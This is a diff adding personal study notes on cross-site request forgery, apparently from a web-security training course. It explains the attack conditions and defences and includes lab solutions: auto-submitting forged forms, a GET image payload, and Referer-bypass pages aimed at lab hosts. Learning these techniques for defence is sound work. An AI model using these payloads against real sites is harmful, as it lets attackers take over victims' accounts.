@@ -1,0 +1,329 @@
+CSRF
+is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform
+It allows an attacker to partly circumvent the same origin policy,
+
+What is the impact of a CSRF attack?
+In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally
+For example, 
+	this might be to change the email address on their account, 
+	to change their password, 
+	or to make a funds transfer.
+
+the attacker might be able to gain full control over the user's account. If the compromised user has a privileged role within the application
+
+How does CSRF work?
+For a CSRF attack to be possible, three key conditions must be in place:
+
+A relevant action. There is an action within the application that the attacker has a reason to induce
+	This might be a privileged action (such as modifying permissions for other users) 
+	any action on user-specific data (such as changing the user's own password).
+
+Cookie-based session handling. 
+	Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. 
+
+No unpredictable request parameters. 
+	The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess
+	For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.
+
+
+For example, suppose an application contains a function that lets the user change the email address on their account. 
+POST /email/change HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE
+
+email=wiener@normal-user.com
+
+This meets the conditions required for CSRF:
+
+The action of changing the email address on a user's account is of interest to an attacker. t.
+The application uses a session cookie to identify which user issued the request. 
+The attacker can easily determine the values of the request parameters that are needed to perform the action.
+
+With these conditions in place, the attacker can construct a web page containing the following HTML:
+
+<html>
+  <body>
+    <form action="https://vulnerable-website.com/email/change" method="POST">
+      <input type="hidden" name="email" value="pwned@evil-user.net" />
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
+If a victim user visits the attacker's web page, the following will happen:
+
+The attacker's page will trigger an HTTP request to the vulnerable web site.
+If the user is logged in to the vulnerable web site, their browser will automatically include their session cookie in the request (assuming SameSite cookies are not being used).
+The vulnerable web site will process the request in the normal way, treat it as having been made by the victim user, and change their email address.
+
+How to construct a CSRF attack
+1)Select a request anywhere in Burp Suite Professional that you want to test or exploit.
+2)From the right-click context menu, select Engagement tools / Generate CSRF PoC.
+3)Burp Suite will generate some HTML that will trigger the selected request (minus cookies, which will be added automatically by the victim's browser).
+4)You can tweak various options in the CSRF PoC generator to fine-tune aspects of the attack. You might need to do this in some unusual situations to deal with quirky features of requests.
+5)Copy the generated HTML into a web page, view it in a browser that is logged in to the vulnerable web site, and test whether the intended request is issued successfully and the desired action occurs.
+
+1) CSRF vulnerability with no defenses
+2) CSRF where token validation depends on request method
+3) Validation of CSRF token depends on token being present
+4) CSRF token is not tied to the user session
+5) CSRF token is tied to a non-session cookie
+6) CSRF token is simply duplicated in a cookie
+7) Referer-based defenses against CSRF
+8) Validation of Referer depends on header being present
+9) CSRF with broken Referer validation
+10) 
+11) 
+
+
+
+
+Lab: CSRF vulnerability with no defenses
+ log in to your own account using the following credentials: wiener:peter
+
+<form class="login-form" name="change-email-form" action="https://ac051f511f0fa549c0048566003500e0.web-security-academy.net/my-account/change-email" method="POST">
+<input required="" type="hidden" name="csrf" value="TKdHFRAx2pzIx5QjHHDazg6x7I9y4Ky1">
+<input required type="email" name="email" value="myhacking@email.com">
+<button class='button' type='submit'> Update email </button>
+</form>
+<script>
+document.forms[0].submit();
+</script>
+
+
+How to deliver a CSRF exploit
+ the attacker will place the malicious HTML onto a web site that they control, and then induce victims to visit that web site
+	done by feeding the user a link to the web site
+	 via an email or social media message
+	if the attack is placed into a popular web site (for example, in a user comment),
+	some simple CSRF exploits employ the GET method and can be fully self-contained with a single URL on the vulnerable web site
+
+ In the preceding example, if the request to change email address can be performed with the GET method, then a self-contained attack would look like this:
+
+<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
+
+What is the difference between XSS and CSRF?
+Cross-site scripting (or XSS) allows an attacker to execute arbitrary JavaScript within the browser of a victim user.
+Cross-site request forgery (or CSRF) allows an attacker to induce a victim user to perform actions that they do not intend to.
+
+The consequences of XSS vulnerabilities are generally more serious than for CSRF vulnerabilities:
+
+CSRF often only applies to a subset of actions that a user is able to perform. 
+CSRF can be described as a "one-way" vulnerability
+Conversely, XSS is "two-way"
+
+Can CSRF tokens prevent XSS attacks?
+Some XSS attacks can indeed be prevented through effective use of CSRF tokens. Consider a simple reflected XSS vulnerability that can be trivially exploited like this:
+
+https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
+
+Now, suppose that the vulnerable function includes a CSRF token:
+
+https://insecure-website.com/status?csrf-token=CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz&message=<script>/*+Bad+stuff+here...+*/</script>
+
+Assuming that the server properly validates the CSRF token, and rejects requests without a valid token,
+If an exploitable XSS vulnerability exists anywhere on a site, then the vulnerability can be leveraged to make a victim user perform actions even if those actions are themselves protected by CSRF tokens. In this situation, the attacker's script can request the relevant page to obtain a valid CSRF token, and then use the token to perform the protected action.
+CSRF tokens do not protect against stored XSS vulnerabilities. If a page that is protected by a CSRF token is also the output point for a stored XSS vulnerability, then that XSS vulnerability can be exploited in the usual way, and the XSS payload will execute when a user visits the page.
+
+
+Preventing CSRF attacks
+The most robust way to defend against CSRF attacks is to include a CSRF token 
+
+The token should be:
+1 )Unpredictable with high entropy, as for session tokens in general.
+2) Tied to the user's session.
+3) Strictly validated in every case before the relevant action is executed.
+
+What are CSRF tokens?
+A CSRF token is a unique, secret, unpredictable value that is generated by the server-side application and transmitted to the client in such a way that it is included in a subsequent HTTP request made by the client
+
+How should CSRF tokens be generated?
+CSRF tokens should contain significant entropy and be strongly unpredictable, with the same properties as session tokens.
+use a cryptographic strength pseudo-random number generator (PRNG), seeded with the timestamp when it was created plus a static secret.
+
+How should CSRF tokens be transmitted?
+is to transmit the token to the client within a hidden field of an HTML form that is submitted using the POST method. 
+<input type="hidden" name="csrf-token" value="CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz" />
+
+For additional safety, the field containing the CSRF token should be placed as early as possible within the HTML document,
+
+An alternative approach, of placing the token into the URL query string, is somewhat less safe because the query string:
+
+Is logged in various locations on the client and server side;
+Is liable to be transmitted to third parties within the HTTP Referer header; and
+can be displayed on-screen within the user's browser.
+
+How should CSRF tokens be validated?
+1) When a CSRF token is generated, it should be stored server-side within the user's session data
+2) the server-side application should verify that the request includes a token which matches the value that was stored in the user's session.
+3) validation must be performed regardless of the HTTP method or content type of the request.
+4) If the request does not contain any token at all, it should be rejected
+
+Common CSRF vulnerabilities
+Most interesting CSRF vulnerabilities arise due to mistakes made in the validation of CSRF tokens.
+
+POST /email/change HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
+
+csrf=WfF1szMUHhiokx9AHFply5L2xAOfjRkE&email=wiener@normal-user.com
+
+ it violates the necessary conditions for a CSRF vulnerability:
+	1) the application no longer relies solely on cookies for session handling,
+	2) the request contains a parameter whose value an attacker can determine.
+
+
+Validation of CSRF token depends on request method
+------------------------------------------------------
+Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.
+
+In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF attack:
+
+GET /email/change?email=pwned@evil-user.net HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
+
+Lab: CSRF where token validation depends on request method
+This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.
+<form class="login-form" name="change-email-form" action="https://ac051f511f0fa549c0048566003500e0.web-security-academy.net/my-account/change-email" method="GET">
+<input required="" type="hidden" name="csrf" value="TKdHFRAx2pzIx5QjHHDazg6x7I9y4Ky1">
+<input required type="email" name="email" value="myhacking@email.com">
+<button class='button' type='submit'> Update email </button>
+</form>
+<script>
+document.forms[0].submit();
+</script>
+
+Validation of CSRF token depends on token being present
+----------------------------------------------------------
+Some applications correctly validate the token when it is present but skip the validation if the token is omitted.
+
+In this situation, the attacker can remove the entire parameter containing the token (not just its value) to bypass the validation and deliver a CSRF attack:
+
+POST /email/change HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 25
+Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
+
+email=pwned@evil-user.net
+
+Lab: CSRF where token validation depends on token being present
+<form class="login-form" name="change-email-form" action="https://ac051f511f0fa549c0048566003500e0.web-security-academy.net/my-account/change-email" method="POST">
+<input required type="email" name="email" value="myhacking@email.com">
+<button class='button' type='submit'> Update email </button>
+</form>
+<script>
+document.forms[0].submit();
+</script>
+
+CSRF token is not tied to the user session
+Some applications do not validate that the token belongs to the same session 
+In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack.
+
+Lab: CSRF where token is not tied to user session
+<form class="login-form" name="change-email-form" action="https://ac051f511f0fa549c0048566003500e0.web-security-academy.net/my-account/change-email" method="POST">
+<input required="" type="hidden" name="csrf" value="TKdHFRAx2pzIx5QjHHDazg6x7I9y4Ky1">
+<input required type="email" name="email" value="myhacking@email.com">
+<button class='button' type='submit'> Update email </button>
+</form>
+<script>
+document.forms[0].submit();
+</script>
+
+where csrf token belongs to different user, session token is for different ser
+
+CSRF token is tied to a non-session cookie
+some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together:
+
+POST /email/change HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv
+
+csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
+
+This situation is harder to exploit but is still vulnerable.
+If the web site contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible.
+The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.
+
+Lab: CSRF where token is tied to non-session cookie
+
+
+
+CSRF token is simply duplicated in a cookie
+some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie. This is sometimes called the "double submit"
+
+POST /email/change HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
+
+csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
+
+Lab: CSRF where token is duplicated in cookie
+Remove the script block, and instead add the following code to inject the cookie and submit the form:
+<img src="$cookie-injection-url" onerror="document.forms[0].submit();"/>
+
+Referer-based defenses against CSRF
+-----------------------------------
+some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain
+
+Validation of Referer depends on header being present
+--------------------------------------------------------
+Some applications validate the Referer header when it is present in requests but skip the validation if the header is omitted.
+
+Lab: CSRF where Referer validation depends on header being present
+CSRF where Referer validation depends on header being present
+------------------------------------------------------------
+<html>
+<head><meta name="referrer" content="no-referrer"></head>
+<body>
+<script>history.pushState("", "", "/") </script>
+<form class="login-form" name="change-email-form" action="https://ac9d1f9a1e54917bc0f7074c00df0087.web-security-academy.net/my-account/change-email" method="POST">
+<input required type="email" name="email" value="myhacking@email.com">
+<button class='button' type='submit'> Update email </button>
+</form>
+<script>
+document.forms[0].submit();
+</script>
+</body>
+</html>
+
+Validation of Referer can be circumvented
+Some applications validate the Referer header in a naive way that can be bypassed. For example, if the application validates that the domain in the Referer starts with the expected value, then the attacker can place this as a subdomain of their own domain:
+http://vulnerable-website.com.attacker-website.com/csrf-attack
+
+Likewise, if the application simply validates that the Referer contains its own domain name, then the attacker can place the required value elsewhere in the URL:
+http://attacker-website.com/csrf-attack?vulnerable-website.com
+
+Lab: CSRF with broken Referer validation
+This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.
+
+<html>
+<body>
+<script>history.pushState("", "", "/?your-lab-id.web-security-academy.net") </script>
+<form class="login-form" name="change-email-form" action="https://ac971f461e080477c0e4105b00fc00a0.web-security-academy.net/my-account/change-email" method="POST">
+<input required type="email" name="email" value="myhacking@email.com">
+<button class='button' type='submit'> Update email </button>
+</form>
+<script>
+document.forms[0].submit();
+</script>
+</body>
+</html>
+
+HEAD
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Referrer-Policy: unsafe-url
+
+
